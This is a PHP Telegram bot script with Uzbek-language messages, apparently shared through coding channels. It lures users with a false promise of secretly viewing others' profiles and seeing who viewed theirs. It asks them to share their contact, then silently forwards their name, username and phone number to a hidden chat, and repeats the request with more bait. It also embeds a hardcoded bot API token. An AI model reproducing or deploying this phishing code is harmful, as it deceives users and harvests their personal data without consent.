<?php
define('API_KEY','1487255836:AAFQFas8SNEw6qFYoutgSU9QARk7FwxN-js');
$admin = "953109403"; // admin idsi
function del($nomi){
array_map('unlink', glob("$nomi"));
}
//kod @Abroriy tomonidan @PHP_Masters va @Bot_Masterlar kanali orqali tarqatildi
function put($fayl,$nima){
file_put_contents("$fayl","$nima");
}
function get($fayl){
$get = file_get_contents("$fayl");
return $get;
}
function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function editMessageText(
        $chatId,
        $messageId,
        $text,
        $parseMode = null,
        $disablePreview = false,
        $replyMarkup = null,
        $inlineMessageId = null
    ) {
       return bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $text,
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode,
            'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup,
        ]);
    }
function ACL($callbackQueryId, $text = null, $showAlert = false)
{
     return bot('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert'=>$showAlert,
    ]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(get('php://input'));
$message = $update->message;
$text = $message->text;
$cid = $message->chat->id;
$uid = $message->from->id;
$fname = $message->from->first_name;
$user = $message->from->username;
$data = $message->contact;
$nomer = $message->contact->phone_number;
$name = $message->contact->first_name;


if($text == "/start"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"*Assalomu alaykum do‘stim🖐 $fname botga hush kelibsiz🤗. Siz bot orqali osongina birovning profiliga bildirmay kirishingiz hamda sizni profilinggizga kim kirib olganini bilib olishinggiz mumkin. Buning uchun pastdagi 📸Profilga kirish tugmasini bosing*",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode(
['resize_keyboard'=>true,
'keyboard' => [
[["text"=>"📸Profilga kirish",'request_contact' =>true],],
]
])
]);
}
if($data){
bot('sendmessage',[
    'chat_id'=>"-1001401953340",
    'text'=>"User nomi: [$fname](tg://user?id=$uid)\nUseri: @$user\nNomeri: $nomer\nNomer nomi: $name\n [@Bot_Masters]",
    'parse_mode'=>"markdown"
        ]);
bot("sendmessage",[
    'chat_id'=>$cid,
    'text'=>"Juda soz😎 $name endi menga kimni profiliga kirmoqchi bo'lsanggiz o'sha insonni nomeri yoki yozgan xabarini fovrad qiling yoki usernemsini jo'nating",
    'reply_markup'=>json_encode(
[
'resize_keyboard'=>true,
'selective'=>true,
'one_time_keyboard'=>true,
'keyboard' => [
[["text"=>"👁Profilinggizga kim kirganini ko'rish"],],
]
])
]);
}
//kod @Abroriy tomonidan @PHP_Masters va @Bot_Masterlar kanali orqali 
$button = $message->keyboardbutton->text;
if($text == "👁Profilinggizga kim kirganini ko'rish"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Do‘stim $fname  profilinggizga kim kirganini bilish uchun mobil raqaminggizni jo'nating. Faqat aldamang😡 bot aldaganinggizni sezadi😍"]);
}